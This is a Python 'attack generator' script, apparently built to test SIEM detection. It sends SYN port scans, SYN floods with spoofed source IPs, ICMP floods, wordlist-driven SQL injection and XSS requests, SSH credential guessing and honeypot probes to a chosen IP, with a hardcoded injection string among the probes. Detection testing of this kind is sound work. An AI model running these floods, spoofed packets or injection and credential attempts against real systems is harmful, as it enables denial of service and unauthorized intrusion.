#!/usr/bin/env python3
"""
Professional Attack Generator for SIEM Demonstration
Version: 2.0
Author: SIEM Project Team
License: MIT (Educational Use Only)

DISCLAIMER:
This tool is designed EXCLUSIVELY for educational purposes and controlled
security testing in authorized environments. Unauthorized use against systems
you don't own is ILLEGAL and may result in criminal prosecution.

Features:
- Real attack patterns from security research
- Configurable via JSON config file
- Wordlist-based attacks (usernames, passwords, payloads)
- Detailed logging and reporting
- Progress tracking and statistics
- Safe defaults with confirmation prompts
"""

import socket
import requests
import time
import random
import json
import logging
import os
import sys
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Tuple
from collections import defaultdict

try:
    from scapy.all import *
except ImportError:
    print("ERROR: Scapy not installed. Run: sudo pip3 install scapy")
    sys.exit(1)

class AttackLogger:
    """Enhanced logging system for attack tracking"""
    
    def __init__(self, log_file: str = "attack_generator.log", level: str = "INFO"):
        self.log_file = log_file
        self.setup_logging(level)
        self.stats = defaultdict(int)
        self.results = []
    
    def setup_logging(self, level: str):
        """Configure logging system"""
        log_level = getattr(logging, level.upper(), logging.INFO)
        
        # Create formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        
        # File handler
        file_handler = logging.FileHandler(self.log_file)
        file_handler.setFormatter(formatter)
        
        # Configure logger
        self.logger = logging.getLogger('AttackGenerator')
        self.logger.setLevel(log_level)
        self.logger.addHandler(console_handler)
        self.logger.addHandler(file_handler)
    
    def log_attack(self, attack_type: str, target: str, status: str, details: str = ""):
        """Log individual attack"""
        self.logger.info(f"{attack_type} → {target} [{status}] {details}")
        self.stats[f"{attack_type}_{status}"] += 1
        self.results.append({
            'timestamp': datetime.now().isoformat(),
            'attack_type': attack_type,
            'target': target,
            'status': status,
            'details': details
        })
    
    def get_summary(self) -> Dict:
        """Get attack statistics summary"""
        return dict(self.stats)
    
    def save_results(self, filename: str = "attack_results.json"):
        """Save detailed results to JSON"""
        with open(filename, 'w') as f:
            json.dump({
                'timestamp': datetime.now().isoformat(),
                'summary': self.get_summary(),
                'detailed_results': self.results
            }, f, indent=2)
        self.logger.info(f"Results saved to {filename}")


class WordlistLoader:
    """Load and manage wordlists from files"""
    
    def __init__(self, base_path: str = "wordlists"):
        self.base_path = Path(base_path)
        self.cache = {}
    
    def load_list(self, filename: str, skip_comments: bool = True) -> List[str]:
        """Load wordlist from file"""
        cache_key = filename
        if cache_key in self.cache:
            return self.cache[cache_key]
        
        filepath = self.base_path / filename
        
        if not filepath.exists():
            raise FileNotFoundError(f"Wordlist not found: {filepath}")
        
        items = []
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                # Skip empty lines and comments
                if line and not (skip_comments and line.startswith('#')):
                    # For port files, extract just the port number
                    if ',' in line and filename == 'common_ports.txt':
                        port = line.split(',')[0].strip()
                        if port.isdigit():
                            items.append(int(port))
                    else:
                        items.append(line)
        
        self.cache[cache_key] = items
        return items
    
    def load_ports(self) -> List[int]:
        """Load common ports"""
        return self.load_list('common_ports.txt')
    
    def load_usernames(self) -> List[str]:
        """Load common usernames"""
        return self.load_list('usernames.txt')
    
    def load_passwords(self) -> List[str]:
        """Load common passwords"""
        return self.load_list('passwords.txt')
    
    def load_sql_payloads(self) -> List[str]:
        """Load SQL injection payloads"""
        return self.load_list('sql_injection.txt')
    
    def load_xss_payloads(self) -> List[str]:
        """Load XSS payloads"""
        return self.load_list('xss_payloads.txt')


class ProfessionalAttackGenerator:
    """
    Professional-grade attack generator with configurable options
    """
    
    def __init__(self, config_file: str = "attack_config.json"):
        self.config = self.load_config(config_file)
        self.target_ip = self.config['targets']['default']
        self.logger = AttackLogger(
            self.config['logging']['log_file'],
            self.config['logging']['log_level']
        )
        
        # Initialize wordlist loader
        script_dir = Path(__file__).parent
        wordlist_path = script_dir / "wordlists"
        self.wordlists = WordlistLoader(str(wordlist_path))
        
        self.print_banner()
    
    def load_config(self, config_file: str) -> Dict:
        """Load configuration from JSON file"""
        config_path = Path(__file__).parent / config_file
        
        if not config_path.exists():
            self.logger.logger.error(f"Config file not found: {config_path}")
            sys.exit(1)
        
        with open(config_path, 'r') as f:
            return json.load(f)
    
    def print_banner(self):
        """Print professional banner"""
        banner = f"""
╔══════════════════════════════════════════════════════════════════════╗
║           PROFESSIONAL ATTACK GENERATOR v2.0                         ║
║              Educational Security Testing Tool                        ║
╚══════════════════════════════════════════════════════════════════════╝

⚙️  Configuration Loaded:
   • Target: {self.target_ip}
   • Wordlists: {len(self.wordlists.cache)} cached
   • Logging: {self.config['logging']['log_file']}
   
⚠️  LEGAL DISCLAIMER:
   This tool is for AUTHORIZED TESTING ONLY. Unauthorized use is illegal.
   Only use in controlled environments with proper authorization.

"""
        print(banner)
    
    def port_scan_professional(self):
        """
        Professional Port Scanning with wordlist
        Uses real-world common ports from security research
        """
        if not self.config['attack_settings']['port_scan']['enabled']:
            self.logger.logger.info("Port scan disabled in config")
            return
        
        print("\n" + "="*70)
        print("🔍 ATTACK 1: PROFESSIONAL PORT SCANNING")
        print("="*70)
        
        try:
            ports = self.wordlists.load_ports()
            settings = self.config['attack_settings']['port_scan']
            
            if settings['randomize']:
                random.shuffle(ports)
            
            print(f"📊 Scanning {len(ports)} common ports from wordlist...")
            print(f"⏱️  Delay: {settings['scan_delay']}s between ports\n")
            
            success_count = 0
            
            for i, port in enumerate(ports, 1):
                try:
                    # Create SYN packet
                    ip = IP(dst=self.target_ip)
                    syn = TCP(sport=RandShort(), dport=port, flags='S')
                    packet = ip/syn
                    
                    # Send packet
                    send(packet, verbose=0)
                    
                    print(f"  [{i:3d}/{len(ports)}] Port {port:5d} → SYN sent", end='\r')
                    
                    self.logger.log_attack(
                        "PORT_SCAN", 
                        f"{self.target_ip}:{port}",
                        "SUCCESS",
                        f"SYN packet sent"
                    )
                    
                    success_count += 1
                    time.sleep(settings['scan_delay'])
                    
                except Exception as e:
                    self.logger.log_attack(
                        "PORT_SCAN",
                        f"{self.target_ip}:{port}",
                        "FAILED",
                        str(e)
                    )
            
            print(f"\n\n✅ Port scan completed: {success_count}/{len(ports)} ports scanned")
            print(f"📝 Detection expected: 'Port Scanning' alert")
            
        except FileNotFoundError as e:
            self.logger.logger.error(f"Wordlist error: {e}")
            print(f"❌ Error: {e}")
    
    def syn_flood_professional(self):
        """Professional SYN Flood with rate control"""
        if not self.config['attack_settings']['syn_flood']['enabled']:
            return
        
        print("\n" + "="*70)
        print("💥 ATTACK 2: PROFESSIONAL SYN FLOOD")
        print("="*70)
        
        settings = self.config['attack_settings']['syn_flood']
        duration = settings['duration']
        target_port = settings['target_port']
        pps = settings['packets_per_second']
        
        print(f"⚙️  Settings:")
        print(f"   • Duration: {duration}s")
        print(f"   • Target: {self.target_ip}:{target_port}")
        print(f"   • Rate: {pps} packets/second")
        print(f"   • IP Spoofing: {settings['spoof_source']}\n")
        
        start_time = time.time()
        packet_count = 0
        delay = 1.0 / pps
        
        try:
            while time.time() - start_time < duration:
                # Generate random source IP if spoofing enabled
                if settings['spoof_source']:
                    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                else:
                    src_ip = None
                
                # Create and send SYN packet
                if src_ip:
                    ip = IP(src=src_ip, dst=self.target_ip)
                else:
                    ip = IP(dst=self.target_ip)
                
                syn = TCP(sport=RandShort(), dport=target_port, flags='S')
                send(ip/syn, verbose=0)
                
                packet_count += 1
                
                if packet_count % 100 == 0:
                    elapsed = time.time() - start_time
                    current_rate = packet_count / elapsed if elapsed > 0 else 0
                    print(f"  📤 Sent: {packet_count} packets | Rate: {current_rate:.1f} pps | Time: {elapsed:.1f}s", end='\r')
                
                time.sleep(delay)
                
        except KeyboardInterrupt:
            print("\n⚠️  Attack interrupted by user")
        
        total_time = time.time() - start_time
        actual_rate = packet_count / total_time if total_time > 0 else 0
        
        print(f"\n\n✅ SYN Flood completed:")
        print(f"   • Total packets: {packet_count}")
        print(f"   • Actual rate: {actual_rate:.1f} pps")
        print(f"   • Duration: {total_time:.1f}s")
        
        self.logger.log_attack(
            "SYN_FLOOD",
            f"{self.target_ip}:{target_port}",
            "SUCCESS",
            f"{packet_count} packets in {total_time:.1f}s"
        )
    
    def ssh_brute_force_professional(self):
        """
        Professional SSH Brute Force with real wordlists
        Uses common username and password dictionaries
        """
        if not self.config['attack_settings']['ssh_brute_force']['enabled']:
            return
        
        print("\n" + "="*70)
        print("🔐 ATTACK 6: PROFESSIONAL SSH BRUTE FORCE")
        print("="*70)
        
        try:
            usernames = self.wordlists.load_usernames()
            passwords = self.wordlists.load_passwords()
            
            settings = self.config['attack_settings']['ssh_brute_force']
            max_attempts = settings['max_attempts']
            delay = settings['delay_between_attempts']
            port = settings['target_port']
            
            print(f"📚 Loaded wordlists:")
            print(f"   • Usernames: {len(usernames)}")
            print(f"   • Passwords: {len(passwords)}")
            print(f"   • Max attempts: {max_attempts}")
            print(f"   • Delay: {delay}s\n")
            
            # Generate combinations
            combinations = [(u, p) for u in usernames for p in passwords]
            random.shuffle(combinations)
            combinations = combinations[:max_attempts]
            
            print(f"🎯 Testing {len(combinations)} username/password combinations...\n")
            
            success_count = 0
            fail_count = 0
            
            for i, (username, password) in enumerate(combinations, 1):
                try:
                    # Attempt SSH connection
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((self.target_ip, port))
                    
                    # Read SSH banner
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    
                    # Send fake authentication (will fail, but gets logged)
                    auth_attempt = f"{username}:{password}\n".encode()
                    sock.send(auth_attempt)
                    
                    sock.close()
                    
                    print(f"  [{i:3d}/{len(combinations)}] {username:15s} : {password:20s} → Attempted", end='\r')
                    
                    self.logger.log_attack(
                        "SSH_BRUTE_FORCE",
                        f"{self.target_ip}:{port}",
                        "ATTEMPTED",
                        f"{username}:{password}"
                    )
                    
                    success_count += 1
                    time.sleep(delay)
                    
                except socket.timeout:
                    fail_count += 1
                    print(f"  [{i:3d}/{len(combinations)}] {username:15s} : {password:20s} → Timeout    ", end='\r')
                except ConnectionRefusedError:
                    fail_count += 1
                    print(f"  [{i:3d}/{len(combinations)}] {username:15s} : {password:20s} → Refused    ", end='\r')
                except Exception as e:
                    fail_count += 1
            
            print(f"\n\n✅ SSH Brute Force completed:")
            print(f"   • Attempts made: {success_count}")
            print(f"   • Failed connections: {fail_count}")
            print(f"   • Total tested: {len(combinations)}")
            print(f"📝 Detection expected: 'SSH Brute Force' with {success_count} attempts")
            
        except FileNotFoundError as e:
            print(f"❌ Wordlist error: {e}")
            self.logger.logger.error(str(e))
    
    def sql_injection_professional(self):
        """Professional SQL Injection with real payload database"""
        if not self.config['attack_settings']['sql_injection']['enabled']:
            return
        
        print("\n" + "="*70)
        print("💉 ATTACK 4: PROFESSIONAL SQL INJECTION")
        print("="*70)
        
        try:
            payloads = self.wordlists.load_sql_payloads()
            settings = self.config['attack_settings']['sql_injection']
            base_url = settings['target_url']
            delay = settings['delay_between_requests']
            
            print(f"📚 Loaded {len(payloads)} SQL injection payloads")
            print(f"🎯 Target: {base_url}")
            print(f"⏱️  Delay: {delay}s between requests\n")
            
            success_count = 0
            error_count = 0
            
            # Test parameters
            test_params = ['id', 'user', 'search', 'query', 'filter', 'page']
            
            for i, payload in enumerate(payloads, 1):
                try:
                    # Randomly select parameter
                    param = random.choice(test_params)
                    params = {param: payload}
                    
                    print(f"  [{i:3d}/{len(payloads)}] Testing: {payload[:50]:50s}", end='\r')
                    
                    try:
                        response = requests.get(
                            base_url,
                            params=params,
                            timeout=3,
                            headers={'User-Agent': 'Mozilla/5.0 (Security Test)'}
                        )
                        
                        status = "SUCCESS" if response.status_code == 200 else "ERROR"
                        
                        self.logger.log_attack(
                            "SQL_INJECTION",
                            base_url,
                            status,
                            f"Param: {param}, Payload: {payload[:30]}, Status: {response.status_code}"
                        )
                        
                        if response.status_code == 200:
                            success_count += 1
                        
                    except requests.exceptions.RequestException:
                        # Service may not be available, but payload is sent to network detector
                        self.logger.log_attack(
                            "SQL_INJECTION",
                            base_url,
                            "SENT",
                            f"Param: {param}, Payload: {payload[:30]}"
                        )
                        error_count += 1
                    
                    time.sleep(delay)
                    
                except Exception as e:
                    error_count += 1
            
            print(f"\n\n✅ SQL Injection test completed:")
            print(f"   • Payloads tested: {len(payloads)}")
            print(f"   • Successful requests: {success_count}")
            print(f"   • Connection errors: {error_count}")
            print(f"📝 Detection expected: Multiple 'SQL Injection Attempt' alerts")
            
        except FileNotFoundError as e:
            print(f"❌ Wordlist error: {e}")
    
    def xss_attack_professional(self):
        """Professional XSS Attack with comprehensive payload database"""
        if not self.config['attack_settings']['xss_attack']['enabled']:
            return
        
        print("\n" + "="*70)
        print("🔗 ATTACK 5: PROFESSIONAL XSS ATTACK")
        print("="*70)
        
        try:
            payloads = self.wordlists.load_xss_payloads()
            settings = self.config['attack_settings']['xss_attack']
            base_url = settings['target_url']
            delay = settings['delay_between_requests']
            
            print(f"📚 Loaded {len(payloads)} XSS payloads")
            print(f"🎯 Target: {base_url}")
            print(f"⏱️  Delay: {delay}s between requests\n")
            
            success_count = 0
            
            # Test parameters
            test_params = ['comment', 'message', 'search', 'name', 'description', 'title']
            
            for i, payload in enumerate(payloads, 1):
                try:
                    param = random.choice(test_params)
                    params = {param: payload}
                    
                    print(f"  [{i:3d}/{len(payloads)}] Testing: {payload[:50]:50s}", end='\r')
                    
                    try:
                        response = requests.get(
                            base_url,
                            params=params,
                            timeout=3,
                            headers={'User-Agent': 'Mozilla/5.0 (Security Test)'}
                        )
                        
                        self.logger.log_attack(
                            "XSS_ATTACK",
                            base_url,
                            "SENT",
                            f"Param: {param}, Payload: {payload[:30]}"
                        )
                        
                        success_count += 1
                        
                    except requests.exceptions.RequestException:
                        self.logger.log_attack(
                            "XSS_ATTACK",
                            base_url,
                            "SENT",
                            f"Param: {param}, Payload: {payload[:30]}"
                        )
                        success_count += 1
                    
                    time.sleep(delay)
                    
                except Exception as e:
                    pass
            
            print(f"\n\n✅ XSS Attack test completed:")
            print(f"   • Payloads tested: {len(payloads)}")
            print(f"   • Requests sent: {success_count}")
            print(f"📝 Detection expected: Multiple 'XSS Attack Attempt' alerts")
            
        except FileNotFoundError as e:
            print(f"❌ Wordlist error: {e}")
    
    def icmp_flood_professional(self):
        """Professional ICMP Flood with rate control"""
        if not self.config['attack_settings']['icmp_flood']['enabled']:
            return
        
        print("\n" + "="*70)
        print("📡 ATTACK 3: PROFESSIONAL ICMP FLOOD")
        print("="*70)
        
        settings = self.config['attack_settings']['icmp_flood']
        duration = settings['duration']
        pps = settings['packets_per_second']
        payload_size = settings['payload_size']
        
        print(f"⚙️  Settings:")
        print(f"   • Duration: {duration}s")
        print(f"   • Rate: {pps} packets/second")
        print(f"   • Payload size: {payload_size} bytes\n")
        
        start_time = time.time()
        packet_count = 0
        delay = 1.0 / pps
        
        payload = b'X' * payload_size
        
        try:
            while time.time() - start_time < duration:
                ip = IP(dst=self.target_ip)
                icmp = ICMP() / payload
                send(ip/icmp, verbose=0)
                
                packet_count += 1
                
                if packet_count % 50 == 0:
                    print(f"  📤 Sent: {packet_count} ICMP packets", end='\r')
                
                time.sleep(delay)
                
        except KeyboardInterrupt:
            print("\n⚠️  Attack interrupted")
        
        print(f"\n\n✅ ICMP Flood completed: {packet_count} packets sent")
        
        self.logger.log_attack(
            "ICMP_FLOOD",
            self.target_ip,
            "SUCCESS",
            f"{packet_count} packets"
        )
    
    def honeypot_trigger_professional(self):
        """Professional Honeypot triggering"""
        if not self.config['attack_settings']['honeypot_trigger']['enabled']:
            return
        
        print("\n" + "="*70)
        print("🍯 ATTACK 7: PROFESSIONAL HONEYPOT TRIGGER")
        print("="*70)
        
        settings = self.config['attack_settings']['honeypot_trigger']
        ports = settings['ports']
        delay = settings['delay_between_connections']
        
        print(f"🎯 Triggering {len(ports)} honeypot services...\n")
        
        for port in ports:
            try:
                print(f"  → Connecting to port {port}...", end=' ')
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target_ip, port))
                
                # Send service-specific payload
                payloads = {
                    2222: b"SSH-2.0-OpenSSH_7.4\r\n",
                    8080: b"GET /?id=1' OR '1'='1 HTTP/1.1\r\nHost: target\r\n\r\n",
                    3306: b"admin\x00password123\x00",
                    5432: b"SELECT version();\x00",
                    1433: b"SELECT @@VERSION\x00",
                    21: b"USER admin\r\nPASS password\r\n"
                }
                
                if port in payloads:
                    sock.send(payloads[port])
                
                try:
                    response = sock.recv(1024)
                    print(f"✅ Triggered ({len(response)} bytes received)")
                except:
                    print(f"✅ Triggered")
                
                sock.close()
                
                self.logger.log_attack(
                    "HONEYPOT_TRIGGER",
                    f"{self.target_ip}:{port}",
                    "SUCCESS",
                    f"Service on port {port}"
                )
                
                time.sleep(delay)
                
            except ConnectionRefusedError:
                print(f"❌ Not active")
            except socket.timeout:
                print(f"⏱️  Timeout")
            except Exception as e:
                print(f"❌ Error: {e}")
        
        print(f"\n✅ Honeypot trigger sequence completed")
    
    def run_full_demonstration(self):
        """Run complete professional demonstration"""
        print("\n" + "="*70)
        print("🚀 STARTING PROFESSIONAL ATTACK DEMONSTRATION")
        print("="*70)
        
        attacks = [
            ("Port Scanning", self.port_scan_professional),
            ("SYN Flood", self.syn_flood_professional),
            ("ICMP Flood", self.icmp_flood_professional),
            ("SQL Injection", self.sql_injection_professional),
            ("XSS Attack", self.xss_attack_professional),
            ("SSH Brute Force", self.ssh_brute_force_professional),
            ("Honeypot Triggers", self.honeypot_trigger_professional)
        ]
        
        total_attacks = len([a for a in attacks if True])  # Count enabled attacks
        completed = 0
        
        for name, attack_func in attacks:
            try:
                print(f"\n{'='*70}")
                print(f"⚡ Running: {name} ({completed + 1}/{total_attacks})")
                print('='*70)
                
                attack_func()
                completed += 1
                
                if completed < total_attacks:
                    print(f"\n⏳ Waiting 3 seconds before next attack...")
                    time.sleep(3)
                
            except KeyboardInterrupt:
                print(f"\n\n⚠️  Demonstration interrupted by user")
                break
            except Exception as e:
                print(f"\n❌ Error in {name}: {e}")
                self.logger.logger.error(f"Attack {name} failed: {e}")
        
        # Print final summary
        self.print_summary()
    
    def print_summary(self):
        """Print attack summary and statistics"""
        print("\n" + "="*70)
        print("📊 ATTACK DEMONSTRATION SUMMARY")
        print("="*70)
        
        stats = self.logger.get_summary()
        
        print("\n📈 Attack Statistics:")
        for key, value in sorted(stats.items()):
            print(f"   • {key:30s}: {value:4d}")
        
        print(f"\n💾 Detailed logs saved to: {self.logger.log_file}")
        
        if self.config['logging']['save_results']:
            results_file = self.config['logging']['results_file']
            self.logger.save_results(results_file)
            print(f"📄 Results saved to: {results_file}")
        
        print("\n" + "="*70)
        print("✅ DEMONSTRATION COMPLETED")
        print("="*70)
        print("\n🔍 Check your SIEM dashboard to see all detected attacks!")
        print("📊 Review logs for detailed analysis")


def main():
    """Main entry point"""
    
    # Check for root privileges
    if os.geteuid() != 0:
        print("❌ ERROR: This script requires root privileges")
        print("   Run with: sudo python3 attack_generator.py")
        sys.exit(1)
    
    # Change to script directory
    os.chdir(Path(__file__).parent)
    
    # Display warning
    print("\n" + "="*70)
    print("⚠️  LEGAL WARNING ⚠️")
    print("="*70)
    print("""
This tool generates REAL ATTACKS against computer systems.

✅ AUTHORIZED USE ONLY:
   • Your own systems for testing
   • Authorized penetration testing
   • Educational demonstrations in controlled environments

❌ ILLEGAL USE:
   • Attacking systems you don't own
   • Unauthorized network scanning
   • Any malicious activity

🚨 Unauthorized use may result in:
   • Criminal prosecution
   • Civil lawsuits
   • Network bans
   • Academic expulsion

By proceeding, you confirm you have proper authorization.
""")
    
    response = input("Type 'I UNDERSTAND' to continue: ")
    if response != 'I UNDERSTAND':
        print("\n❌ Operation cancelled")
        sys.exit(0)
    
    # Optional: Set custom target
    print("\n" + "="*70)
    custom_target = input("Enter target IP (press Enter for localhost 127.0.0.1): ").strip()
    
    # Initialize attack generator
    generator = ProfessionalAttackGenerator()
    
    if custom_target:
        generator.target_ip = custom_target
        print(f"🎯 Target set to: {custom_target}")
    
    print("\n⚠️  IMPORTANT:")
    print("   • Ensure SIEM detectors are running")
    print("   • Ensure dashboard is accessible")
    print("   • Have monitoring ready to see detections\n")
    
    input("Press Enter to start the attack demonstration...")
    
    # Run demonstration
    try:
        generator.run_full_demonstration()
    except KeyboardInterrupt:
        print("\n\n⚠️  Demonstration interrupted by user")
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        logging.exception("Fatal error in main")
    
    print("\n👋 Exiting...")


if __name__ == '__main__':
    main()
